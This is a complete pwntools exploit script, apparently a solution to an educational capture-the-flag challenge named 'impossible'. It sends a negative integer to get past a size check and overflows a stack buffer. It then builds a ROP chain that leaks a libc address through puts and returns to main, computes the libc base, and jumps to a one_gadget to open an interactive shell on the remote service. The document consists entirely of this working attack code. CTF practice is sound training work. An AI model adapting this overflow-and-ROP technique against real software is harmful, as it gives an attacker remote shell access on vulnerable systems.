from pwn import *

context.arch = 'amd64'
r = remote('eductf.zoolab.org', 10105)
#r = process('./impossible')
pause()

r.sendlineafter(': ', '-2147483648')
pop_rdi = p64(0x400873)
puts = p64(0x4005b0)
leak = p64(0x601020)
main = p64(0x400748)
payload = b'a' * (0x100+8)
payload += pop_rdi
payload += leak
payload += puts
payload += main

r.sendlineafter(':)\n', payload)
tmp = r.recvuntil('\n')
tmp = tmp[:len(tmp)-1] + b'\x00'*2
tmp = u64(tmp)
base = tmp - 0x64e80

r.sendlineafter(': ', '-2147483648')

one_gadget = p64(base+0x4f2c5)
system = p64(base+0x4f440)
bin_sh = p64(base+0x1b3e9a)

payload = b'a' * (0x100+8)
payload += one_gadget
r.sendlineafter(':)\n', payload)

r.interactive()